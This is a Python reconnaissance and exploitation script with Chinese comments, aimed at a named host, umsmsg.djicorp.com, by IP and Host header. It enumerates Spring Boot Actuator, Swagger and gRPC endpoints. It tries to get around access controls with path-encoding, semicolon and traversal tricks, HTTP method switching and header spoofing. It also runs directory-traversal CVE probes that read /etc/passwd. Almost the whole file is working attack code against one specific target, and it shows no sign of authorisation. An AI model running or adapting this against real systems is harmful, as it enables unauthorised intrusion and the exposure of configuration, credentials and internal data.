#!/usr/bin/env python3
"""
PESop v3.3 - Spring Boot 专项安全测试
目标: umsmsg.djicorp.com
"""
import socket, struct, time, json, sys, ssl, urllib.request

HOST = '240.240.1.18'
PORT = 80

# ============================================================
# Spring Boot Actuator 端点列表（含历史版本路径）
# ============================================================
ACTUATOR_ENDPOINTS = [
    # Spring Boot 2.x / 3.x 标准路径
    "/actuator", "/actuator/", "/actuator/health", "/actuator/info",
    "/actuator/env", "/actuator/configprops", "/actuator/beans",
    "/actuator/mappings", "/actuator/routes", "/actuator/filters",
    "/actuator/metrics", "/actuator/prometheus", "/actuator/heapdump",
    "/actuator/threaddump", "/actuator/actuator/sessions",
    "/actuator/logfile", "/actuator/loggers", "/actuator/caches",
    "/actuator/scheduledtasks", "/actuator/conditions",
    "/actuator/shutdown", "/actuator/restart", "/actuator/refresh",
    "/actuator/gateway", "/actuator/gateway/routes",
    "/actuator/httptrace", "/actuator/auditevents",
    "/actuator/health/", "/actuator/info/",
    "/actuator/env/resolver", "/actuator/env/management",
    # Spring Boot 1.x 遗留路径
    "/env", "/health", "/info", "/metrics", "/dump", "/trace",
    "/beans", "/mappings", "/configprops", "/autoconfig",
    "/heapdump", "/logfile", "/loggers", "/restart", "/refresh",
    "/jolokia", "/jolokia/", "/jolokia/list",
    # Swagger / OpenAPI
    "/swagger-ui.html", "/swagger-ui/", "/swagger-resources",
    "/v2/api-docs", "/v3/api-docs", "/v3/api-docs/swagger-config",
    "/openapi.json", "/api-docs", "/api-docs/swagger-config",
    # Spring Boot Admin / DevTools
    "/__admin", "/dev", "/dev/",
    # Custom
    "/api", "/api/", "/api/v1", "/api/v2",
    "/management", "/management/",
    "/internal", "/internal/",
]

# ============================================================
# Spring Boot 路径匹配绕过测试
# ============================================================
PATH_BYPASSES = [
    # URL 编码绕过
    "%2e/actuator", "%2e%2e/actuator",
    # 分号绕过 (Tomcat path parameter)
    "/;/actuator", "/;/actuator/health",
    "/.;/actuator", "/..;/actuator",
    "/%3B/actuator",
    # 双斜线 bypass
    "//actuator", "//actuator//health",
    "///actuator",
    # 路径遍历
    "/..;/actuator/health", "/..%252f..%252factuator",
    # Spring Boot 特有: 斜杠变体
    "/actuator%00/health", "/actuator%0d/health",
    # 大小写绕过
    "/Actuator", "/ACTUATOR",
    # Unicode 绕过
    "/\u0061ctuator",
    # 尾部特殊字符
    "/actuator.", "/actuator;/", "/actuator%20",
    "/actuator/*", "/actuator/health*",
    # 参数污染
    "/actuator/health?env", "/actuator?env",
    # Spring Cloud Gateway 绕过
    "/actuator/gateway/routes", "/actuator/gateway/",
    # 通过 gRPC 协议访问 actuator
    "/actuator/health"  # gRPC content-type 版本
]

# ============================================================
# Spring Boot 版本指纹
# ============================================================
SPRING_VERSION_FINGERPRINTS = {
    "Spring Boot 1.x": ["/env", "/autoconfig", "/dump", "/trace", "/beans"],
    "Spring Boot 2.x": ["/actuator/health", "/actuator/info"],
    "Spring Boot 3.x": ["/actuator/health", "/actuator/info"],
}

def encode_varint(value):
    result = []
    while value > 0x7F:
        result.append((value & 0x7F) | 0x80)
        value >>= 7
    result.append(value & 0x7F)
    return bytes(result)

def http_get(path, headers=None, raw_socket=False):
    """发送 HTTP GET 请求"""
    if headers is None:
        headers = {}
    hdr_str = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    req = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: umsmsg.djicorp.com\r\n"
        f"Accept: */*\r\n"
        f"{hdr_str}"
        f"\r\n"
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((HOST, PORT))
        s.sendall(req.encode())
        resp = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
                if b"\r\n\r\n" in resp:
                    hdr_part, body = resp.split(b"\r\n\r\n", 1)
                    cl = 0
                    for line in hdr_part.decode(errors="ignore").split("\r\n"):
                        if line.lower().startswith("content-length:"):
                            cl = int(line.split(":")[1].strip())
                    if len(body) >= cl:
                        break
            except socket.timeout:
                break
        return resp
    except Exception as e:
        return f"Error: {e}".encode()
    finally:
        s.close()

def http_post_grpc(path, body=b'', headers=None):
    """发送 gRPC POST 请求"""
    if headers is None:
        headers = {}
    extra_h = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
    msg_len = len(body)
    frame = struct.pack("!BI", 0, msg_len) + body
    req = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: umsmsg.djicorp.com\r\n"
        f"Content-Type: application/grpc\r\n"
        f"TE: trailers\r\n"
        f"{extra_h}"
        f"Content-Length: {5 + msg_len}\r\n"
        f"\r\n"
    ).encode() + frame
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(5)
    try:
        s.connect((HOST, PORT))
        s.sendall(req)
        resp = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                resp += chunk
            except: break
        return resp
    except Exception as e:
        return f"Error: {e}".encode()
    finally:
        s.close()

def parse_response(resp):
    result = {"raw_len": len(resp)}
    if isinstance(resp, bytes):
        text = resp.decode(errors="ignore")
        for line in text.split("\r\n"):
            if line.startswith("HTTP/"):
                parts = line.split(" ")
                result["status"] = parts[1] if len(parts) > 1 else "?"
            elif line.lower().startswith("content-type:"):
                result["content_type"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("content-length:"):
                result["body_len"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("server:"):
                result["server"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("set-cookie:"):
                result.setdefault("cookies", []).append(line.split(":", 1)[1].strip())
            elif line.lower().startswith("x-"):
                result.setdefault("headers", {})[line.split(":")[0]] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("grpc-status:"):
                result["grpc_status"] = line.split(":", 1)[1].strip()
            elif line.lower().startswith("grpc-message:"):
                result["grpc_message"] = line.split(":", 1)[1].strip()
        if "\r\n\r\n" in text:
            body = text.split("\r\n\r\n", 1)[1]
            if body and body != "RBAC: access denied":
                result["body_start"] = body[:200]
    return result

def test_actuator_endpoints():
    print("=" * 70)
    print("Spring Boot Actuator 端点枚举")
    print("=" * 70)
    
    results = []
    for path in ACTUATOR_ENDPOINTS:
        resp = http_get(path)
        parsed = parse_response(resp)
        status = parsed.get("status", "?")
        ct = parsed.get("content_type", "")
        body = parsed.get("body_start", "")
        server = parsed.get("server", "")
        
        if status != "403" or "json" in ct or len(body) > 20:
            results.append((path, parsed))
            print(f"[+] {path}: HTTP {status} | CT: {ct} | Server: {server}")
            if body:
                print(f"    Body: {body[:150]}")
    
    return results

def test_path_bypasses():
    print("\n" + "=" * 70)
    print("Spring Boot 路径匹配绕过测试")
    print("=" * 70)
    
    for path in PATH_BYPASSES:
        resp = http_get(path)
        parsed = parse_response(resp)
        status = parsed.get("status", "?")
        ct = parsed.get("content_type", "")
        body = parsed.get("body_start", "")
        
        if status != "403" or ("json" in ct and "whitelabel" not in body.lower()):
            print(f"[!] 绕过可能: {path}")
            print(f"    HTTP {status} | CT: {ct} | Body: {body[:100]}")
        elif status == "200" or status == "500":
            print(f"[?] 非常规响应: {path} → HTTP {status}")

def test_spring_error_page():
    print("\n" + "=" * 70)
    print("Spring Boot Whitelabel Error Page 探测")
    print("=" * 70)
    
    # Spring Boot 默认错误页会返回特定格式
    trigger_paths = [
        "/nonexistent-path-12345",
        "/api/nonexistent",
        "/actuator/nonexistent",
        "/error",
    ]
    
    for path in trigger_paths:
        resp = http_get(path)
        text = resp.decode(errors="ignore").lower()
        
        # Spring Boot Whitelabel signature
        whitelabel_sigs = ["whitelabel", "this application has no explicit mapping", 
                          "timestamp", "status", "error", "message", "path"]
        found_sigs = [s for s in whitelabel_sigs if s in text]
        
        if "whitelabel" in text:
            print(f"[!] {path}: Whitelabel Error Page 确认!")
            print(f"    Body: {resp.decode(errors='ignore')[:300]}")
        elif len(found_sigs) >= 3:
            print(f"[?] {path}: 可能的 Spring 错误响应 (命中特征: {found_sigs})")
        elif "404" not in text:
            status = "?"
            for line in resp.decode(errors="ignore").split("\r\n"):
                if line.startswith("HTTP/"):
                    status = line.split(" ")[1] if " " in line else "?"
                    break
            if status != "403":
                print(f"[?] {path}: HTTP {status}")

def test_grpc_via_actuator():
    print("\n" + "=" * 70)
    print("gRPC 协议探测 Actuator 端点")
    print("=" * 70)
    
    actuators = [
        "actuator", "actuator.health", "actuator.info",
        "actuator.env", "actuator.mappings", "actuator.beans",
        "actuator.configprops", "actuator.metrics",
        "actuator.loggers", "actuator.httptrace",
        "actuator.gateway.routes", "actuator.caches",
        "actuator.conditions", "actuator.scheduledtasks",
        "actuator.heapdump", "actuator.threaddump",
        "actuator.logfile",
    ]
    
    # gRPC 要求路径格式为 /package.Service/Method
    for act in actuators:
        for method in ["", ".Get", ".List", ".Health", ".Check", ".Index"]:
            path = f"/{act}{method}"
            resp = http_post_grpc(path)
            parsed = parse_response(resp)
            grpc = parsed.get("grpc_status", "")
            http_status = parsed.get("status", "?")
            msg = parsed.get("grpc_message", "")
            
            if grpc and grpc != "7":
                print(f"[!] gRPC {path}: HTTP {http_status}, gRPC status {grpc}, msg={msg}")
            elif grpc and grpc == "12":
                pass  # UNIMPLEMENTED - expected for wrong paths
            elif grpc == "7" and msg != "RBAC: access denied":
                print(f"[?] gRPC {path}: gRPC status 7, msg={msg}")

def test_spring_cve_probes():
    print("\n" + "=" * 70)
    print("Spring Boot 已知 CVE 探测")
    print("=" * 70)
    
    # CVE-2023-34055: Spring Boot error page information disclosure
    print("[*] CVE-2023-34055: Spring Boot error page 信息泄露")
    for trigger in ["/actuator/env/test%20property", "/env/test%20property"]:
        resp = http_get(trigger)
        text = resp.decode(errors="ignore")
        if "whitelabel" in text.lower() and ("status=404" in text or '"status":404' in text):
            print(f"  [?] {trigger}: 可能的信息泄露")
    
    # CVE-2021-21234: Spring Boot Actuator logfile directory traversal
    print("[*] CVE-2021-21234: Spring Boot Actuator logfile 目录遍历")
    for path in ["/actuator/logfile/..", "/actuator/logfile/../etc/passwd"]:
        resp = http_get(path)
        if b"root:" in resp:
            print(f"  [!] 目录遍历确认!")
    
    # CVE-2020-5410: Spring Cloud Config directory traversal
    print("[*] CVE-2020-5410: Spring Cloud Config 目录遍历")
    resp = http_get("/..%252F..%252Fetc%252Fpasswd")
    if b"root:" in resp:
        print("  [!] 目录遍历确认!")

def test_spring_grpc_interceptor():
    print("\n" + "=" * 70)
    print("Spring Boot gRPC 框架指纹与认证绕过")
    print("=" * 70)
    
    # gRPC-spring-boot-starter 默认配置测试
    # 尝试不同的 gRPC 服务路径模式
    grpc_paths = [
        # grpc-spring-boot-starter 默认路径
        "/grpc", "/grpc/", "/grpc.health.v1.Health/Check",
        "/grpc.health.v1.Health/Watch",
        # Spring Boot 反射端点
        "/api/grpc", "/api/grpc/",
        # 带 proto 扩展名的路径
        "/umsmsg.proto", "/ums.proto", "/message.proto",
        "/api/v1/proto", "/api/v1/protobuf",
    ]
    
    for path in grpc_paths:
        # HTTP GET
        resp = http_get(path)
        parsed = parse_response(resp)
        status = parsed.get("status", "?")
        body = parsed.get("body_start", "")
        if status != "403":
            print(f"[?] GET {path}: HTTP {status} | {body[:100]}")
        
        # HTTP POST gRPC
        resp2 = http_post_grpc(path)
        parsed2 = parse_response(resp2)
        grpc = parsed2.get("grpc_status", "")
        http_s = parsed2.get("status", "?")
        msg = parsed2.get("grpc_message", "")
        if grpc and grpc != "7":
            print(f"[!] gRPC {path}: HTTP {http_s}, status {grpc}, msg={msg}")

def test_spring_cloud_gateway():
    print("\n" + "=" * 70)
    print("Spring Cloud Gateway 探测")
    print("=" * 70)
    
    gateway_paths = [
        "/actuator/gateway/routes", "/actuator/gateway/globalfilters",
        "/actuator/gateway/routefilters", "/actuator/gateway/routes/",
        "/gateway", "/gateway/routes",
    ]
    
    for path in gateway_paths:
        resp = http_get(path)
        parsed = parse_response(resp)
        status = parsed.get("status", "?")
        body = parsed.get("body_start", "")
        if "gateway" in body.lower() or status not in ["403", "404"]:
            print(f"[?] {path}: HTTP {status} | {body[:100]}")
        
        # Try via gRPC
        resp2 = http_post_grpc(path)
        parsed2 = parse_response(resp2)
        grpc = parsed2.get("grpc_status", "")
        if grpc and grpc != "7":
            print(f"[!] gRPC {path}: status {grpc}")

def test_spring_security_bypass():
    print("\n" + "=" * 70)
    print("Spring Security 配置探测与绕过")
    print("=" * 70)
    
    # Spring Security 常见绕过技术
    sec_bypasses = [
        # HTTP 方法变换
        {"path": "/actuator", "method": "GET"},
        {"path": "/actuator", "method": "POST"},
        {"path": "/actuator", "method": "PUT"},
        {"path": "/actuator", "method": "DELETE"},
        {"path": "/actuator", "method": "PATCH"},
        {"path": "/actuator", "method": "OPTIONS"},
        {"path": "/actuator", "method": "HEAD"},
        {"path": "/actuator", "method": "TRACE"},
        # Headers 欺骗
        {"path": "/actuator/health", "headers": {"X-Forwarded-For": "127.0.0.1"}},
        {"path": "/actuator/health", "headers": {"Origin": "https://admin.djicorp.com"}},
        {"path": "/actuator/health", "headers": {"Referer": "https://admin.djicorp.com/"}},
        # Content-Type 切换
        {"path": "/actuator/health", "headers": {"Content-Type": "application/x-www-form-urlencoded"}},
        {"path": "/actuator/health", "headers": {"Accept": "application/xml"}},
    ]
    
    for bypass in sec_bypasses:
        path = bypass["path"]
        headers = bypass.get("headers", {})
        method = bypass.get("method", "GET")
        
        hdr_str = "".join(f"{k}: {v}\r\n" for k, v in headers.items())
        req = (
            f"{method} {path} HTTP/1.0\r\n"
            f"Host: umsmsg.djicorp.com\r\n"
            f"{hdr_str}"
            f"\r\n"
        )
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((HOST, PORT))
            s.sendall(req.encode())
            resp = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    resp += chunk
                except: break
            
            text = resp.decode(errors="ignore")
            status = "?"
            for line in text.split("\r\n"):
                if line.startswith("HTTP/"):
                    status = line.split(" ")[1] if " " in line else "?"
            if status not in ["403", "000", "?"]:
                print(f"[?] {method} {path} ({headers.get('X-Forwarded-For','') or headers.get('Content-Type','') or ''}): HTTP {status}")
        except:
            pass
        finally:
            s.close()

if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    
    if mode == "actuator":
        test_actuator_endpoints()
    elif mode == "bypass":
        test_path_bypasses()
        test_spring_security_bypass()
    elif mode == "error":
        test_spring_error_page()
    elif mode == "cve":
        test_spring_cve_probes()
    elif mode == "grpc":
        test_grpc_via_actuator()
        test_spring_grpc_interceptor()
        test_spring_cloud_gateway()
    elif mode == "spring":
        test_actuator_endpoints()
        test_path_bypasses()
        test_spring_error_page()
        test_spring_cloud_gateway()
    elif mode == "all":
        print("██████╗ ███████╗░██████╗ ██████╗ ██████╗ ")
        print("██╔══██╗██╔════╝██╔════╝ ██╔═══╝ ██╔══██╗")
        print("██████╔╝█████╗  ██║  ███╗██████╗  ██████╔╝")
        print("██╔═══╝ ██╔══╝  ██║   ██║██╔══██╗ ██╔═══╝ ")
        print("██║     ███████╗╚██████╔╝██████╔╝ ██║     ")
        print("╚═╝     ╚══════╝ ╚═════╝ ╚═════╝  ╚═╝     ")
        print("  Spring Boot 专项安全扫描 v1.0")
        print("  目标: umsmsg.djicorp.com")
        print()
        
        test_actuator_endpoints()
        test_path_bypasses()
        test_spring_error_page()
        test_spring_cloud_gateway()
        test_spring_security_bypass()
        test_spring_grpc_interceptor()
        test_grpc_via_actuator()
        test_spring_cve_probes()
        
        print("\n" + "=" * 70)
        print("Spring Boot 专项测试完成")
        print("=" * 70)